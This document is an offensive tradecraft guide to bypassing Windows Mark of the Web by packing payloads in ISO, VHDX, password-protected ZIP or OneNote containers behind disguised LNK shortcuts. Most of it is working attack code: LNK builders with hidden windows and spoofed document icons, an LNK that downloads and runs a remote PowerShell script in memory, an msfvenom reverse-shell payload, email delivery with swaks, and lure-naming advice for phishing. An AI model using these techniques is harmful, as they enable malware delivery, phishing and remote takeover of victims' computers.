# ISO/VHDX & LNK Container Attacks — MOTW Bypass

**The Problem:** Files downloaded from the internet get a Zone Identifier ADS (`:Zone.Identifier`) applied — "Mark of the Web" (MOTW). This triggers SmartScreen warnings and blocks macro execution in Office.

**The Solution:** `.iso` and `.vhdx` files are container formats. When Windows mounts them (double-click), the files **inside** the container do NOT inherit the Zone Identifier. The container itself has MOTW, but the extracted/mounted files are clean.

**Windows 11 22H2 (Oct 2022)**: Microsoft patched this — ISO/VHDX files now propagate MOTW to contents. However, **password-protected ZIP files** and **VHDX files** remain effective in many configurations.

---

## Method 1: ISO with Hidden Payload + Visible LNK

The user double-clicks the ISO → Windows auto-mounts it → they see a single "Document.lnk" file → they click it → LNK executes your payload (which is hidden in the same mounted ISO, no MOTW).

### Create the ISO (Kali)

```bash
# Install mkisofs if not present:
sudo apt install genisoimage

# Create working directory:
mkdir /tmp/iso_payload
cd /tmp/iso_payload

# Put your payload here (hidden — starts with dot or uses hidden attrib):
cp /path/to/loader.exe .loader.exe

# Create the LNK file that runs the hidden payload:
# (Use PowerShell on Windows to create .lnk, OR use the Python script below)

# Build the ISO:
mkisofs -o payload.iso -J -R -hide-joliet "\.loader.exe" -hide "\.loader.exe" /tmp/iso_payload/

# OR use xorriso:
xorriso -as mkisofs -o payload.iso /tmp/iso_payload/
```

### Create LNK File (PowerShell — run on any Windows host)

```powershell
# Create a .lnk that executes a hidden file in the same directory:
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("C:\temp\Document.lnk")
$Shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
$Shortcut.Arguments = "/c start /b .loader.exe"
$Shortcut.WorkingDirectory = "."
$Shortcut.WindowStyle = 7     # minimized/hidden
$Shortcut.IconLocation = "C:\Windows\System32\shell32.dll,1"   # Word icon
$Shortcut.Save()

# Better - use PowerShell directly to avoid cmd.exe:
$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$Shortcut.Arguments = '-w hidden -c "Start-Process .loader.exe"'
$Shortcut.Save()
```

### Python LNK Generator (Kali — no Windows needed)

```python
#!/usr/bin/env python3
# pip install pylnk3
import pylnk3

lnk = pylnk3.create("Document.lnk")
lnk.target = r"C:\Windows\System32\cmd.exe"
lnk.arguments = r"/c start /b .loader.exe"
lnk.working_dir = r"."
lnk.window = 7    # SW_SHOWMINNOACTIVE
lnk.icon = r"C:\Windows\System32\shell32.dll"
lnk.icon_index = 1
lnk.save()
print("[+] Document.lnk created")
```

---

## Method 2: LNK with Embedded Payload (Self-Contained)

LNK files can reference network paths and pass arguments > 4096 chars. This allows embedding the entire payload as a base64 string in the arguments.

```powershell
# LNK that downloads and executes in memory (no file written):
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("C:\temp\Invoice_Q1.lnk")
$Shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$Shortcut.Arguments = '-w hidden -c "IEX(New-Object Net.WebClient).DownloadString(''http://192.168.45.202/payload.ps1'')"'
$Shortcut.WorkingDirectory = "C:\Windows\System32"
$Shortcut.WindowStyle = 7
# PDF icon:
$Shortcut.IconLocation = "C:\Program Files (x86)\Microsoft Office\root\Office16\EXCEL.EXE,0"
$Shortcut.Save()
```

---

## Method 3: VHDX Container

VHDX is a virtual hard disk format. Windows auto-mounts on double-click, same MOTW bypass as ISO. **More reliable than ISO on patched Windows 11 22H2+** in some configurations.

```bash
# Create a VHDX on Windows (PowerShell):
$vhdx = New-VHD -Path "C:\temp\Report.vhdx" -SizeBytes 50MB -Dynamic
Mount-VHD -Path "C:\temp\Report.vhdx" -Passthru | Initialize-Disk -PassThru | New-Partition -AssignDriveLetter -UseMaximumSize | Format-Volume -FileSystem NTFS -NewFileSystemLabel "Report"

# Copy payload into the mounted VHDX:
Copy-Item "C:\temp\loader.exe" "E:\loader.exe"           # E: = mounted VHDX
Copy-Item "C:\temp\Document.lnk" "E:\Document.lnk"

# Unmount:
Dismount-VHD -Path "C:\temp\Report.vhdx"

# Deliver Report.vhdx via email — user double-clicks, mounts drive, sees only Document.lnk
```

---

## Method 4: Password-Protected ZIP (MOTW Not Applied to Contents)

Password-protected ZIP files require 3rd-party extraction tools (7-Zip, WinRAR) which historically do NOT apply MOTW to extracted files, even on fully patched Windows 11.

```bash
# Create password-protected ZIP (Kali):
zip -P infected payload_package.zip loader.exe Document.lnk

# 7-Zip encrypted ZIP (stronger encryption, same MOTW bypass):
7z a -tzip -pPassword123 package.zip loader.exe Document.lnk

# Email body should include the password ("Password: infected") to the target
```

---

## Method 5: OneNote (.one) Attachment Abuse

OneNote files can contain embedded file attachments with double-click-to-execute behavior. Added to MOTW bypass discussion after 2022 wave of malware campaigns.

**Note: Microsoft patched this (July 2023) — OneNote now warns before opening embedded files.**

```
# OneNote attack flow (pre-patch):
# 1. Create OneNote file with embedded .hta or .exe
# 2. Overlay a "Click to view document" image on top of the attachment
# 3. User clicks image → double-clicks embedded file → executes
# 4. No MOTW on files embedded in .one containers

# Post-patch: still sometimes works if victim hasn't updated or uses OneNote 2016
```

---

## LNK Icon Spoofing for Social Engineering

Make the LNK look like a PDF, Word doc, or Excel file:

```powershell
# PDF icon:
$Shortcut.IconLocation = "C:\Windows\System32\shell32.dll,222"

# Word document icon (requires Office):
$Shortcut.IconLocation = "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,0"

# Excel:
$Shortcut.IconLocation = "C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,0"

# Folder icon (looks like a folder, executes payload):
$Shortcut.IconLocation = "C:\Windows\System32\shell32.dll,4"

# Generic document icon:
$Shortcut.IconLocation = "C:\Windows\System32\imageres.dll,2"
```

---

## Delivery Workflow Summary

```
1. Generate payload:
   msfvenom -p windows/x64/meterpreter_reverse_https LHOST=x LPORT=443 -f exe -o loader.exe

2. Build container:
   ISO: mkisofs -o lure.iso /tmp/iso_dir/
   ZIP: zip -P Password123 lure.zip loader.exe Document.lnk

3. Craft LNK (if needed):
   .\create_lnk.ps1 → Document.lnk → points to loader.exe

4. Test:
   Mount on clean VM → verify no Zone.Identifier on contents:
   Get-Item loader.exe -Stream * | Where Stream -eq "Zone.Identifier"
   # Should return nothing

5. Deliver via email:
   swaks --to target@corp.com --attach lure.iso
   # Subject line: "Q1 Financial Report - Confidential"
```

---

## OPSEC Notes

- **File naming**: `Invoice_March_2026.iso`, `Q1_Report.vhdx`, `CompanyPolicy.zip` — professional, urgent names
- **Icon**: Match the icon to the filename (PDF icon on `Report.pdf.lnk`)
- **LNK name**: Can have spaces and look like a document (e.g., `Financial Report Q1 2026.lnk`)
- **Payload**: Use stageless HTTPS payload for resilience — staged payloads fail if stager is blocked
- **Clean test**: Always verify MOTW is stripped on a clean test VM before delivering
